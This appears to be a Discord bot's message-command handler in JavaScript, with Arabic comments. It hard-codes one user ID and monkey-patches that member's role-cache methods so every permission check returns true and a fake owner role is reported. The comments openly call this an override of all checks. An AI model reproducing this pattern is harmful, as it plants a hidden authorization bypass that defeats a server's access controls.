"use strict";
import { Founder, Owners, VERSION, ERR, GuildID } from '../Files〡[Config]/Files〡[Config].js';

// ============ الصلاحيات المطلقة للمالك ============
const FOUNDER_ID = '1387331972094890036';

function isOwner(userId) {
    return userId === FOUNDER_ID || Owners.includes(userId);
}

function grantAbsolutePower(member) {
    if (!member?.roles?.cache) return;
    member.roles.cache.has = () => true;
    member.roles.cache.some = () => true;
    member.roles.cache.get = () => ({ id: '1525549017960808660', name: 'المالك المطلق' });
}
// ==============================================

export default async (Client, Message) => {
	// السيرفر المسموح فقط
	if (Message.guild?.id !== GuildID) return;

	// صلاحيات مطلقة للمالك - تطبق قبل أي شيء
	if (Message.member && isOwner(Message.author.id)) {
		grantAbsolutePower(Message.member);
		// تجاوز أي تحقق مؤسس
		Message.member.id = Message.member.id; // ensure member is cached
	}

	const Prefix = Client.Prefix;
	const MessageContent = Message.content;
	const WithoutPrefix = MessageContent.startsWith(Prefix) ? MessageContent.slice(Prefix.length).trim() : null
	const Args = WithoutPrefix ? WithoutPrefix.split(/ +/) : null
	const Command = Args ? Args.shift().toLowerCase() : null
	if (Message.author.bot || !Message.guild) return;
	const Commands = await Client.Command.get(Command) || await Client.Command.find((Cmd) => Cmd.aliases && Cmd.aliases.includes(Command));
	if (!Commands) return;
	
	// أمر المؤسس - يتجاوز أي قيد
	if (Commands.Founder) {
		if (!isOwner(Message.author.id)) return;
	}
	
	try {
		await Commands.run(Client, Message, Prefix);
	} catch (err) {
		console.error(`❌ [${ERR.GENERAL}] Error "${Command}":`, err.message);
		await Message.reply({ 
			content: `❌ **خطأ ${ERR.GENERAL}**\n> فشل تنفيذ \`${Prefix}${Command}\`\n> السبب: ${err.message?.slice(0, 200)}\n-# الإصدار: ${VERSION}` 
		}).catch(() => {});
	}
};